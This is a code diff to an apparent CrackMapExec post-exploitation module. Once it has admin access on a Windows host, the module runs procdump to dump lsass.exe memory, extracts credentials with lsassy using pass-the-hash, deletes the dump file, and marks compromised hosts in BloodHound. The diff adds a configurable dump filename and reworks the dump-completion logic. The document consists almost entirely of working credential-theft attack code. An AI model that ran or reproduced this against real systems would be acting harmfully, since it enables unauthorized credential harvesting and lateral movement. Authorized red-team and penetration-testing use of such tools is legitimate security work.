@@ -24,6 +24,7 @@ class CMEModule:
             SHARE               Share to upload procdump and dump lsass (default: C$)
             PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
             PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
+            REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: tmp.dmp)
             BLOODHOUND          Enable Bloodhound integration (default: false)
             NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
             NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
@@ -35,6 +36,7 @@ class CMEModule:
         self.share = "C$"
         self.procdump = "procdump.exe"
         self.procdump_path = "/tmp/"
+        self.remote_lsass_dump = "tmp.dmp"
 
         if 'TMP_DIR' in module_options:
             self.tmp_dir = module_options['TMP_DIR']
@@ -47,6 +49,9 @@ class CMEModule:
 
         if 'PROCDUMP_EXE_NAME' in module_options:
             self.procdump = module_options['PROCDUMP_EXE_NAME']
+
+        if 'REMOTE_LSASS_DUMP' in module_options:
+            self.remote_lsass_dump = module_options['REMOTE_LSASS_DUMP']
 
         self.bloodhound = False
         self.neo4j_URI = "127.0.0.1"
@@ -67,8 +72,6 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         if self.bloodhound != False:
-            from neo4j.v1 import GraphDatabase
-            from neo4j.exceptions import AuthError, ServiceUnavailable
             self.set_as_owned(context, connection)
 
         # Verify procdump exists on host
@@ -93,43 +96,28 @@ class CMEModule:
         dumped = False
         while not dumped:
             # Dump using lsass PID
-            command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp""".format(
-                self.tmp_dir, self.procdump, self.tmp_dir)
+            command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
+                self.tmp_dir, self.procdump, self.tmp_dir, self.remote_lsass_dump)
             context.log.debug('Dumping lsass.exe')
             p = connection.execute(command, True)
             context.log.debug(p)
-            output = 0
 
             if 'Dump 1 complete' in p:
                 # Procdump ended
                 context.log.debug('Procdump output fully retrieved')
-                output = 2
+                dumped = True
             elif 'Dump 1 initiated' in p:
                 # Procdump output not fully retrieved
                 context.log.debug('Procdump output partially retrieved')
                 # Since we cannot know when the dump finishes, we wait for 2s
-                time.sleep(2)
-                output = 1
+                time.sleep(5)
+                dumped = True
             elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
                 context.log.error(
                     'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)')
+                return 1
             else:
                 context.log.error('Process lsass.exe error on dump, try with --verbose to see details')
-
-            if output > 0:
-                # Full or partial output, looking for dumpfile
-                regex = r"([A-Za-z0-9-]*.dmp)"
-                matches = re.search(regex, str(p), re.MULTILINE)
-                machine_name = ''
-                if matches:
-                    machine_name = matches.group()
-                    dumped = True
-                    if output == 1:
-                        context.log.debug('Procdump output successfully parsed')
-                else:
-                    context.log.debug("Error getting the lsass dump file name. Trying again")
-            else:
-                context.log.error("Error dumping lsass")
                 return 1
 
         context.log.success("Process lsass.exe was successfully dumped")
@@ -149,10 +137,10 @@ class CMEModule:
         host = connection.host
 
         py_arg = "{}/{}:{}@{}:/{}{}".format(
-            domain_name, username, password, host, self.share, os.path.join(self.tmp_dir, machine_name)
+            domain_name, username, password, host, self.share, os.path.join(self.tmp_dir, self.remote_lsass_dump)
         ).replace("\\", "/")
 
-        command = r"lsassy -j --hashes {}:{} {}".format(lmhash, nthash, py_arg, self.procdump_path + machine_name)
+        command = r"lsassy -j --hashes {}:{} {}".format(lmhash, nthash, py_arg, self.procdump_path + self.remote_lsass_dump)
 
         # Parsing lsass dump remotely
         context.log.info('Parsing dump file with lsassy')
@@ -170,7 +158,7 @@ class CMEModule:
 
         # Delete lsass dump
         try:
-            connection.conn.deleteFile(self.share, self.tmp_dir + machine_name)
+            connection.conn.deleteFile(self.share, self.tmp_dir + self.remote_lsass_dump)
             context.log.success('Deleted lsass dump')
         except Exception as e:
             context.log.error('Error deleting lsass dump : {}'.format(e))
@@ -221,6 +209,8 @@ class CMEModule:
         context.log.highlight(output)
 
     def set_as_owned(self, context, connection):
+        from neo4j.v1 import GraphDatabase
+        from neo4j.exceptions import AuthError, ServiceUnavailable
         hostFQDN = (connection.hostname + "." + connection.domain).upper()
         uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)
 
@@ -249,7 +239,9 @@ class CMEModule:
         driver.close()
 
     def bloodhound_analysis(self, context, connection, username):
-        username = (username + "@" + connection.domain).upper()
+        from neo4j.v1 import GraphDatabase
+        from neo4j.exceptions import AuthError, ServiceUnavailable
+        username = (username + "@" + connection.domain).upper().replace("\\", "\\\\")
         uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)
 
         try:
